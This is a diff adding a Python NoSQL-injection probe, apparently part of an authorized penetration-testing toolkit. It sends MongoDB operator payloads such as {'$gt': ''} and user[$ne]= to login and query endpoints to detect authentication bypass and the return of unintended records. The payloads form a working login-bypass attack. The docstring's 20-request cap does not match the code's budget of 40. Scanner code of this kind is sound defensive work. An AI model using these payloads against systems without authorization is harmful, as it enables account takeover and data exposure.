@@ -1,0 +1,460 @@
+#!/usr/bin/env python3
+"""NoSQL injection probe — tests login and query endpoints for MongoDB operator injection.
+
+Classic attack: POST {"username": {"$gt": ""}, "password": {"$gt": ""}} to a login endpoint
+bypasses authentication on apps that pass user input directly to MongoDB queries without
+sanitization (NodeGoat, MEAN-stack apps with body-parser).
+
+Also tests query params on GET endpoints for operator injection: ?id[$ne]=1 etc.
+
+Flow:
+  1. Find login forms (from form_map or --login-url).
+  2. POST JSON payloads with MongoDB operators ($gt, $ne, $regex, $exists) in place
+     of normal string values for username/password fields.
+  3. Detect auth bypass: response contains a logout link or dashboard content that
+     differs from the normal failed-login response.
+  4. For non-login POST/GET endpoints: inject operator payloads into discovered params
+     and compare responses (information disclosure / bypass).
+
+Emits JSON to stdout:
+    {"findings": [{"type": "nosqli", "severity": "critical"|"high", "url": "<url>",
+                   "param": "<field>", "evidence": "<...>", "confirmed": true}],
+     "trace": [...]}
+
+Safety:
+  * Only in-scope URLs accepted
+  * Read-only operator payloads ($gt, $ne, $regex) — no $where (code exec)
+  * Body cap 1 MB per response
+  * Bounded request budget (20 requests max)
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import re
+import sys
+from urllib.parse import urlparse
+
+try:
+    import requests
+except Exception as e:
+    print(json.dumps({"error": f"requests not available: {e}", "findings": []}))
+    sys.exit(0)
+
+_UA = "vapt-nosqli-probe/1.0 (authorized assessment)"
+_TIMEOUT = 10
+_MAX_BODY = 1_048_576
+_BUDGET = 40
+
+_LOGOUT_RE = re.compile(
+    r"""href\s*=\s*["'][^"']*/(?:auth/)?(?:logout|signout|sign[_-]?out|log[_-]?out)\b"""
+    r"""|>\s*(?:logout|log\s*out|sign\s*out)\s*<""",
+    re.IGNORECASE,
+)
+_BADCREDS_RE = re.compile(
+    r"invalid\s+credentials|incorrect\s+(?:password|username|login)"
+    r"|login\s+failed|authentication\s+failed|wrong\s+password"
+    r"|user\s+not\s+found",
+    re.IGNORECASE,
+)
+_LOGIN_FORM_RE = re.compile(r"""<input\b[^>]*\btype\s*=\s*["']password["']""", re.IGNORECASE)
+
+_USER_NOT_FOUND_RE = re.compile(
+    r"invalid\s+user\s*name|user\s*name\s+(?:not\s+found|does\s+not\s+exist|invalid)"
+    r"|no\s+such\s+user|user\s+not\s+found|unknown\s+user|user\s+does\s+not\s+exist"
+    r"|invalid\s+user(?!\s*name\b)(?:\s|$|\.)",
+    re.IGNORECASE,
+)
+_PASSWORD_WRONG_RE = re.compile(
+    r"invalid\s+password|wrong\s+password|incorrect\s+password"
+    r"|password\s+(?:incorrect|invalid|wrong|mismatch|does\s+not\s+match)",
+    re.IGNORECASE,
+)
+
+_CSRF_RE = re.compile(
+    r"""<input\b[^>]*\bname\s*=\s*["']"""
+    r"(csrf[_-]?token|_csrf|csrfmiddlewaretoken|__RequestVerificationToken|_token|csrf|XSRF-TOKEN)"
+    r"""["'][^>]*\bvalue\s*=\s*["']([^"']*)["']"""
+    r"""|<input\b[^>]*\bvalue\s*=\s*["']([^"']*)["'][^>]*\bname\s*=\s*["']"""
+    r"(csrf[_-]?token|_csrf|csrfmiddlewaretoken|__RequestVerificationToken|_token|csrf|XSRF-TOKEN)"
+    r"""["']""",
+    re.IGNORECASE,
+)
+
+
+def _extract_csrf(html: str) -> tuple[str, str]:
+    """Extract CSRF token name and value from HTML form.
+
+    Returns (field_name, value) — value may be empty for apps that emit
+    the hidden field but don't enforce it (e.g. NodeGoat).
+    """
+    m = _CSRF_RE.search(html or "")
+    if not m:
+        return ("", "")
+    if m.group(1):
+        return (m.group(1), m.group(2) or "")
+    return (m.group(4) or "", m.group(3) or "")
+
+
+_OPERATOR_PAYLOADS = [
+    {"$gt": ""},
+    {"$ne": ""},
+    {"$regex": ".*"},
+    {"$exists": True},
+]
+
+
+def _read_bounded(r: "requests.Response") -> str:
+    chunks: list[bytes] = []
+    total = 0
+    for chunk in r.iter_content(chunk_size=16_384):
+        if not chunk:
+            break
+        chunks.append(chunk)
+        total += len(chunk)
+        if total >= _MAX_BODY:
+            break
+    try:
+        return b"".join(chunks).decode("utf-8", errors="replace")
+    except Exception:
+        return ""
+
+
+def _cookie_from_redis(run_id: str, slot: str = "A") -> str:
+    try:
+        import redis as _redis
+        r = _redis.Redis.from_url(
+            os.environ.get("VAPT_REDIS_URL", "redis://localhost:6379/0"),
+            socket_timeout=3,
+        )
+        val = r.get(f"vapt:webcookie:{run_id}:{slot}")
+        if val:
+            return (val.decode() if isinstance(val, bytes) else str(val)).strip()
+        val = r.get(f"vapt:webcookie:{run_id}")
+        if val:
+            return (val.decode() if isinstance(val, bytes) else str(val)).strip()
+    except Exception:
+        pass
+    return ""
+
+
+def _in_scope(target: str, url: str) -> bool:
+    try:
+        return urlparse(url).hostname == target
+    except Exception:
+        return False
+
+
+def _looks_authenticated(html: str) -> bool:
+    return bool(html) and bool(_LOGOUT_RE.search(html))
+
+
+def _looks_failed_login(html: str) -> bool:
+    return bool(_BADCREDS_RE.search(html or ""))
+
+
+def _error_class(html: str) -> str:
+    """Classify the login error: 'user' if the server says the user wasn't found,
+    'password' if it says the password is wrong, '' otherwise."""
+    if _PASSWORD_WRONG_RE.search(html or ""):
+        return "password"
+    if _USER_NOT_FOUND_RE.search(html or ""):
+        return "user"
+    return ""
+
+
+def main() -> int:
+    p = argparse.ArgumentParser()
+    p.add_argument("--target", required=True)
+    p.add_argument("--login-url", default="", help="login endpoint URL")
+    p.add_argument("--urls", default="", help="comma-separated POST/GET endpoints to test")
+    p.add_argument("--user-field", default="userName", help="login form username field name")
+    p.add_argument("--pass-field", default="password", help="login form password field name")
+    p.add_argument("--params", default="", help="comma-separated param names to test on non-login endpoints")
+    p.add_argument("--run-id", default=os.environ.get("VAPT_RUN_ID", ""))
+    args = p.parse_args()
+
+    target = args.target.strip()
+    out: dict = {"findings": [], "trace": []}
+    budget = [_BUDGET]
+
+    sess = requests.Session()
+    sess.headers.update({"User-Agent": _UA})
+
+    # --- Login bypass testing ---
+    if args.login_url and _in_scope(target, args.login_url):
+        login_url = args.login_url.strip()
+
+        # Fetch login page to get CSRF token (needed for CSRF-protected apps)
+        csrf_name, csrf_val = "", ""
+        try:
+            if budget[0] <= 0:
+                print(json.dumps(out)); return 0
+            budget[0] -= 1
+            page_resp = sess.get(login_url, timeout=_TIMEOUT,
+                                 allow_redirects=True, stream=True)
+            page_body = _read_bounded(page_resp)
+            csrf_name, csrf_val = _extract_csrf(page_body)
+            out["trace"].append({
+                "url": login_url, "status": page_resp.status_code,
+                "note": f"GET login page, csrf={'yes: ' + csrf_name if csrf_name else 'none'}",
+            })
+        except Exception as e:
+            out["trace"].append({"url": login_url, "note": f"GET login page error: {e}"})
+
+        def _refresh_csrf() -> tuple[str, str]:
+            """Re-GET login page to get a fresh CSRF token (consumed after each POST)."""
+            nonlocal csrf_name, csrf_val
+            if not csrf_name:
+                return ("", "")
+            try:
+                if budget[0] <= 0:
+                    return (csrf_name, "")
+                budget[0] -= 1
+                r2 = sess.get(login_url, timeout=_TIMEOUT,
+                              allow_redirects=True, stream=True)
+                b2 = _read_bounded(r2)
+                n, v = _extract_csrf(b2)
+                if n:
+                    csrf_name, csrf_val = n, v
+            except Exception:
+                pass
+            return (csrf_name, csrf_val)
+
+        # Baseline failed-login response (normal string creds, with CSRF token)
+        baseline_body = ""
+        try:
+            if budget[0] <= 0:
+                print(json.dumps(out)); return 0
+            budget[0] -= 1
+            json_payload = {args.user_field: "vapt_nosqli_baseline_user",
+                            args.pass_field: "vapt_nosqli_baseline_pass"}
+            if csrf_name:
+                json_payload[csrf_name] = csrf_val
+            baseline_resp = sess.post(
+                login_url,
+                json=json_payload,
+                timeout=_TIMEOUT, allow_redirects=True, stream=True,
+            )
+            baseline_body = _read_bounded(baseline_resp)
+            out["trace"].append({"url": login_url, "status": baseline_resp.status_code,
+                                 "note": "baseline login JSON (should fail)"})
+        except Exception as e:
+            out["trace"].append({"url": login_url, "note": f"baseline error: {e}"})
+
+        # Form-encoded baseline (some apps only parse form data, not JSON)
+        baseline_form_body = ""
+        try:
+            _refresh_csrf()
+            if budget[0] <= 0:
+                print(json.dumps(out)); return 0
+            budget[0] -= 1
+            form_base = {args.user_field: "vapt_nosqli_baseline_user",
+                         args.pass_field: "vapt_nosqli_baseline_pass"}
+            if csrf_name:
+                form_base[csrf_name] = csrf_val
+            baseline_form_resp = sess.post(
+                login_url,
+                data=form_base,
+                timeout=_TIMEOUT, allow_redirects=True, stream=True,
+            )
+            baseline_form_body = _read_bounded(baseline_form_resp)
+        except Exception:
+            pass
+
+        # Classify baseline error for differential detection.
+        baseline_err = _error_class(baseline_body)
+
+        # Test each operator payload as JSON body
+        for op_payload in _OPERATOR_PAYLOADS:
+            if budget[0] <= 0:
+                break
+            _refresh_csrf()
+            op_name = list(op_payload.keys())[0]
+            payload = {args.user_field: dict(op_payload), args.pass_field: dict(op_payload)}
+            if csrf_name:
+                payload[csrf_name] = csrf_val
+            try:
+                budget[0] -= 1
+                r = sess.post(
+                    login_url, json=payload,
+                    timeout=_TIMEOUT, allow_redirects=True, stream=True,
+                )
+                body = _read_bounded(r)
+                inj_err = _error_class(body)
+                out["trace"].append({
+                    "url": login_url, "status": r.status_code,
+                    "note": f"JSON operator {op_name} → "
+                            f"{'authenticated' if _looks_authenticated(body) else 'no auth'}"
+                            f" err={inj_err or 'none'}",
+                })
+
+                if _looks_authenticated(body) and not _looks_authenticated(baseline_body):
+                    out["findings"].append({
+                        "type": "nosqli",
+                        "severity": "critical",
+                        "url": login_url,
+                        "param": f"{args.user_field}/{args.pass_field}",
+                        "evidence": (
+                            f"NoSQL operator injection login bypass via JSON body: "
+                            f"POST {login_url} with {json.dumps(payload)} "
+                            f"returned authenticated session (logout link present). "
+                            f"Baseline login (string creds) did NOT authenticate. "
+                            f"MongoDB {op_name} operator accepted as query filter."
+                        ),
+                        "confirmed": True,
+                        "post_url": login_url,
+                    })
+                    break
+                if (baseline_err == "user" and inj_err == "password"):
+                    out["findings"].append({
+                        "type": "nosqli",
+                        "severity": "high",
+                        "url": login_url,
+                        "param": args.user_field,
+                        "evidence": (
+                            f"NoSQL operator injection on {args.user_field} via JSON body: "
+                            f"baseline login returned '{baseline_err}' error but "
+                            f"POST with {op_name} operator returned '{inj_err}' error — "
+                            f"MongoDB processed the operator and found a matching user. "
+                            f"Password is checked in application code (not query), "
+                            f"preventing full bypass, but the query injection is confirmed."
+                        ),
+                        "confirmed": True,
+                        "post_url": login_url,
+                    })
+                    break
+            except Exception as e:
+                out["trace"].append({"url": login_url, "note": f"JSON {op_name} error: {e}"})
+
+        # If JSON didn't work, try query-string style: user[$gt]=&pass[$gt]=
+        baseline_form_err = _error_class(baseline_form_body)
+        if not out["findings"]:
+            for op_name in ("$gt", "$ne"):
+                if budget[0] <= 0:
+                    break
+                _refresh_csrf()
+                form_payload = {
+                    f"{args.user_field}[{op_name}]": "",
+                    f"{args.pass_field}[{op_name}]": "",
+                }
+                if csrf_name:
+                    form_payload[csrf_name] = csrf_val
+                try:
+                    budget[0] -= 1
+                    r = sess.post(
+                        login_url, data=form_payload,
+                        timeout=_TIMEOUT, allow_redirects=True, stream=True,
+                    )
+                    body = _read_bounded(r)
+                    inj_err = _error_class(body)
+                    out["trace"].append({
+                        "url": login_url, "status": r.status_code,
+                        "note": f"form operator {op_name} → "
+                                f"{'authenticated' if _looks_authenticated(body) else 'no auth'}"
+                                f" err={inj_err or 'none'}",
+                    })
+
+                    if _looks_authenticated(body) and not _looks_authenticated(baseline_form_body):
+                        out["findings"].append({
+                            "type": "nosqli",
+                            "severity": "critical",
+                            "url": login_url,
+                            "param": f"{args.user_field}/{args.pass_field}",
+                            "evidence": (
+                                f"NoSQL operator injection login bypass via form-encoded body: "
+                                f"POST {login_url} with {args.user_field}[{op_name}]= "
+                                f"returned authenticated session. "
+                                f"Express body-parser parsed bracket notation into MongoDB operator."
+                            ),
+                            "confirmed": True,
+                            "post_url": login_url,
+                        })
+                        break
+                    if (baseline_form_err == "user" and inj_err == "password"):
+                        out["findings"].append({
+                            "type": "nosqli",
+                            "severity": "high",
+                            "url": login_url,
+                            "param": args.user_field,
+                            "evidence": (
+                                f"NoSQL operator injection on {args.user_field} via form-encoded body: "
+                                f"baseline login returned '{baseline_form_err}' error but "
+                                f"POST with {args.user_field}[{op_name}]= "
+                                f"returned '{inj_err}' error — "
+                                f"Express body-parser bracket notation parsed into MongoDB operator. "
+                                f"Query injection confirmed."
+                            ),
+                            "confirmed": True,
+                            "post_url": login_url,
+                        })
+                        break
+                except Exception as e:
+                    out["trace"].append({"url": login_url,
+                                         "note": f"form {op_name} error: {e}"})
+
+    # --- Non-login endpoint testing (query param injection) ---
+    test_urls = [u.strip() for u in args.urls.split(",")
+                 if u.strip() and _in_scope(target, u.strip())]
+    test_params = [p.strip() for p in args.params.split(",") if p.strip()]
+
+    cookie = os.environ.get("VAPT_WEB_LOGIN_COOKIE", "").strip() \
+        or (_cookie_from_redis(args.run_id) if args.run_id else "")
+    if cookie:
+        sess.headers["Cookie"] = cookie
+
+    for url in test_urls[:5]:
+        if budget[0] <= 0:
+            break
+        for param in (test_params or ["id"]):
+            if budget[0] <= 0:
+                break
+            # Baseline: normal value
+            try:
+                budget[0] -= 1
+                base_r = sess.get(url, params={param: "1"},
+                                  timeout=_TIMEOUT, stream=True)
+                base_body = _read_bounded(base_r)
+                base_status = base_r.status_code
+            except Exception:
+                continue
+
+            # Inject [$ne]=1 — should return different/more records if vulnerable
+            try:
+                budget[0] -= 1
+                inj_r = sess.get(url, params={f"{param}[$ne]": "invalid_value_nosqli"},
+                                 timeout=_TIMEOUT, stream=True)
+                inj_body = _read_bounded(inj_r)
+                out["trace"].append({
+                    "url": url, "status": inj_r.status_code,
+                    "note": f"param {param}[$ne] test → {len(inj_body)} bytes "
+                            f"(baseline {len(base_body)} bytes)",
+                })
+
+                if (inj_r.status_code == 200 and base_status == 200
+                        and len(inj_body) > len(base_body) * 1.5
+                        and len(inj_body) > 500):
+                    out["findings"].append({
+                        "type": "nosqli",
+                        "severity": "high",
+                        "url": url,
+                        "param": param,
+                        "evidence": (
+                            f"NoSQL $ne operator injection on {url} param '{param}': "
+                            f"injecting {param}[$ne]=invalid_value returned {len(inj_body)} bytes "
+                            f"vs baseline {len(base_body)} bytes — "
+                            f"response grew >50%, suggesting MongoDB $ne filter returned "
+                            f"unintended records."
+                        ),
+                        "confirmed": True,
+                    })
+            except Exception as e:
+                out["trace"].append({"url": url, "note": f"$ne error: {e}"})
+
+    print(json.dumps(out))
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
